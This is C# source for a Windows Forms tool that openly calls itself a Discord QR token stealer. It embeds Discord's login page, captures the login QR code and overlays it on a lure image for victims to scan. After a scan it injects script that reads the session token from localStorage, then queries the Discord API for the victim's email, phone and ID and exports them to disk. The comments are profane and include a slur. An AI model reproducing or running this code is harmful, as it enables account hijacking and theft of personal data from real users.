using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using CefSharp.WinForms;
using CefSharp;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Discord_QR_Token_Stealer
{
    public partial class qrGrabber : Form
    {
        // stupid shit
        public bool createdQr = false;
        public JToken tokenInfo = null;
        public System.Windows.Forms.Timer timeLeftTimer = new System.Windows.Forms.Timer();
        public TimeSpan timeLeft;
        public DateTime timeStart;
        public DateTime timeEnd;
        public int num = 0;

        // init
        public qrGrabber()
        {
            InitializeComponent();
        }

        // onload code
        private void qrGrabber_Load(object sender, EventArgs e)
        {
            // if console.log exists, delete it
            if (File.Exists("console.log"))
                File.Delete("console.log");

            // delete the prev ones
            foreach (var file in Directory.GetFiles("."))
                if (file.Contains("finalized"))
                    File.Delete(file);

            timeLeftTimer.Interval = 1000;
            timeLeftTimer.Tick += (a, b) =>
            {
                timeLeft = timeEnd - DateTime.UtcNow;
                lblTimeLeft.Invoke((MethodInvoker)(() =>
                {
                    lblTimeLeft.Text = $"{Math.Round(timeLeft.TotalSeconds)} seconds until expiration";
                }));
            };
        }

        void resetTimer()
        {
            timeStart = DateTime.UtcNow;
            timeEnd = timeStart.AddMinutes(2);
        }

        // inject code to get the QR code
        void injectCode()
        {
            // countdown timer
            resetTimer();
            timeLeftTimer.Start();

            // sleep for rendering shit
            Thread.Sleep(1000);
            chromiumWebBrowser1.ExecuteScriptAsync("console.log(document.getElementsByTagName('img')[0].src)");
        }

        void accountLoggedIn()
        {
            timeLeftTimer.Stop();
            chromiumWebBrowser1.ExecuteScriptAsync("var s=document.createElement('iframe');s.style.display='none';document.body.appendChild(s);console.log('token;'+s.contentWindow.localStorage.token);");
        }

        // change a base64 string back into a png and save it
        void base64ToPng(string inp)
        {
            var bytes = Convert.FromBase64String(inp.Substring(22));
            var img = new FileStream("rawcode.png", FileMode.Create);
            img.Write(bytes, 0, bytes.Length);
            img.Close();

            // create the final image
            createFinalImage();

            Debug.WriteLine("Exported base64 to rawcode.png");
        }

        // query discord api for token details (email, phone, tag, id, etc)
        dynamic getTokenDetails(string token)
        {
            try
            {
                // casted as httpwebrequest because i couldnt set user agent without error, fuck you
                var client = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
                client.Headers.Add("authorization", token);
                client.UserAgent = "ur/mom";
            
                // lazy work right here
                return JsonConvert.DeserializeObject(new StreamReader(client.GetResponse().GetResponseStream()).ReadToEnd());
            } catch (Exception ex)
            {
                // even more lazy work
                Debug.WriteLine(ex);
                return null;
            }
        }

        // create the final image
        void createFinalImage()
        {
            try
            {
                // load template file into picturebox
                currentCode.Image = Image.FromFile("template.png");

                // qr code
                var top = Image.FromFile("overlay.png");
                var qr = Image.FromFile("rawcode.png");
                var grap = Graphics.FromImage(qr);
                //grap.DrawImage(top, (qr.Width / 2) - (top.Width / 2), (qr.Height / 2) - (top.Height / 2));
                grap.DrawImage(top, (top.Width / 2), (top.Height / 2));

                // final image
                var temp = Image.FromFile("template.png");
                var grap2 = Graphics.FromImage(temp);
                grap2.DrawImage(qr, 120, 409);

                // GOD FUCKING DAMN IT
                // fuck all this shit
                // extra hour i was up fixing stupid ass fucking GDI issues, go fuck yourself
                // fucking deal with this autistic code
                try
                {
                    temp.Save($"finalized-{num}.png");
                    temp.Dispose();

                    if (File.Exists($"finalized-{num-2}.png"))
                        File.Delete($"finalized-{num-2}.png");
                }
                catch (Exception ex){ Debug.WriteLine(ex); }


                // set image to qr
                currentCode.Image = Image.FromFile($"finalized-{num}.png");
                
                // dispose images
                top.Dispose();
                qr.Dispose();

                // dispose graphics
                grap.Dispose();
                grap2.Dispose();

                // show message box if not first time
                //if (createdQr)
                //    MessageBox.Show("Previous QR code expired, new one has been generated", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                createdQr = true;
                num++;
            } catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }

        void updateInfo(string token)
        {
            // token information frm token supplied
            tokenInfo = getTokenDetails(token);

            // invoke it cause im too lazy to check if its required or not
            lblToken.Invoke((MethodInvoker)(() =>
            {
                // setting data, substrings are for proper formatting
                lblToken.Text = token;
                lblTag.Text = $"{tokenInfo["username"].ToString().Substring(1, tokenInfo["username"].ToString().Length - 2)}#{tokenInfo["discriminator"].ToString().Substring(1, tokenInfo["discriminator"].ToString().Length - 2)}";
                lblId.Text = tokenInfo["id"].ToString().Substring(1, tokenInfo["id"].ToString().Length - 2);
                lblPhone.Text = tokenInfo["phone"].ToString().Substring(1, tokenInfo["phone"].ToString().Length - 2);
                lblEmail.Text = tokenInfo["email"].ToString().Substring(1, tokenInfo["email"].ToString().Length - 2);
            }));
        }

        // says its loaded
        private void chromiumWebBrowser1_IsBrowserInitializedChanged(object sender, EventArgs e)
        {
            // load discord login
            chromiumWebBrowser1.Load("https://discord.com/login");

            // register console message event
            chromiumWebBrowser1.ConsoleMessage += (source, msg) =>
            {
                // more lazy coding
                if (msg.Message.Contains("handshake complete awaiting remote auth"))
                    injectCode();
                else if (msg.Message.StartsWith("data:image/png;base64,"))
                    base64ToPng(msg.Message);
                else if (msg.Message.StartsWith("token;"))
                    updateInfo(msg.Message.Substring(7, msg.Message.Length - 8));

                //File.AppendAllText("console.log", $"{msg.Message}\n");
                listBox2.Invoke((MethodInvoker)(() => {
                    listBox2.Items.Add(msg.Message);
                }));
            };
        }

        // clicking on side image
        private void currentCode_Click(object sender, EventArgs e)
        {
            // copying to clipboard
            Clipboard.SetImage(currentCode.Image);
        }

        // if the address has changed and its not the login page anymore, congrats, youve done something i suppose
        private void chromiumWebBrowser1_AddressChanged(object sender, AddressChangedEventArgs e)
        {
            // about the laziest i can get i think
            if (chromiumWebBrowser1.Address != "https://discord.com/login")
            {
                accountLoggedIn();
            }
        }

        // click on one of the 5 labels, copy the content
        private void copyControlText_Click(object sender, EventArgs e)
        {
            // i kinda hate this
            var text = sender.GetType().GetProperty("Text");
            Clipboard.SetText(text.GetValue(sender).ToString());
        }

        private void exportInfo_Click(object sender, EventArgs e)
        {
            // make sure it exists
            if (tokenInfo == null)
            {
                // fuck u
                MessageBox.Show("No token has been logged to check!");
                return;
            }

            // bruh
            if (!Directory.Exists("exports"))
                Directory.CreateDirectory("exports");

            // its 6:30 am help
            File.WriteAllText($"exports/token_export_{tokenInfo["id"].ToString().Substring(1, tokenInfo["id"].ToString().Length - 2)}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
        }

        // reload button
        private void reloadPage_Click(object sender, EventArgs e)
        {
            chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);
        }

        // fix maybe??
        // seems to work
        private void qrGrabber_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void info_Click(object sender, EventArgs e)
        {
            new infoPanel().Show();
        }
    }
}
